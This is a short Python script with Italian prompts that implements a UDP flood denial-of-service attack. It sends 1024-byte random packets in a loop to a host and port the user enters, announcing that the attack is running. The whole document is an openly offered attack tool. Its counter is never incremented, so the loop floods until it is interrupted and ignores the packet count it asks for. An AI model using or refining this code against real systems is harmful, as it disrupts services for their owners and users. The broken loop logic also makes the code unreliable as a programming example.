import socket
import os
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
target = input("\nInserisci TARGET: ")
porta = int(input("\nInerisci il numero della porta su cui vuoi ascoltare: "))
quantità = int(input("\nQuanti pacchetti vuoi inviare? "))
    
dimensione_pacchetto = 1024
contenuto_pacchetto = os.urandom(dimensione_pacchetto)
contatore_pacchetti = 0
print(f"Sto eseguendo l'attacco verso {target}:{porta}")

try:
    while contatore_pacchetti<quantità:
            sock.sendto(contenuto_pacchetto, (target, porta))
            contatore_pacchetti + 1

except KeyboardInterrupt:
        print("\nAttacco interrotto")
finally:
        sock.close()
